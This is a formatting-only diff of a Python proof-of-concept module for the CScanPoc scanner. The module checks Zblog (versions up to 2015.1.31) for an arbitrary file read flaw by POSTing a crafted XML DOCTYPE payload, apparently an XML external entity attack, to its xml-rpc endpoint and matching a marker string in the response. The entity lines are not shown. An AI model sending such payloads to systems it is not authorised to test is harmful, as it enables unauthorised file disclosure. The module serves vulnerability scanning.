@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Zblog_0002'  # 平台漏洞编号，留空
     name = 'Zblog 任意文件读取'  # 漏洞名称
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     product = 'Zblog'  # 漏洞应用名称
     product_version = 'Zblog <=2015.1.31'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '0f766a02-6fb5-4f5d-85c1-eb77ada15c39'
     author = 'cscan'  # POC编写者
@@ -32,7 +34,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            verify_url =  self.target + "/zb_system/xml-rpc/index.php"
+            verify_url = self.target + "/zb_system/xml-rpc/index.php"
 
             data = '''<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
                     <!DOCTYPE root [
@@ -42,17 +44,19 @@ class Poc(ABPoc):
                     </root>
                     <root/>      
             '''
-            content = requests.post(verify_url, data=data, headers = {'Content-Type' : 'text/xml'}).content
-           
+            content = requests.post(verify_url, data=data, headers={
+                                    'Content-Type': 'text/xml'}).content
+
             if '595bb9ce8726b4b55f538d3ca0ddfd' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
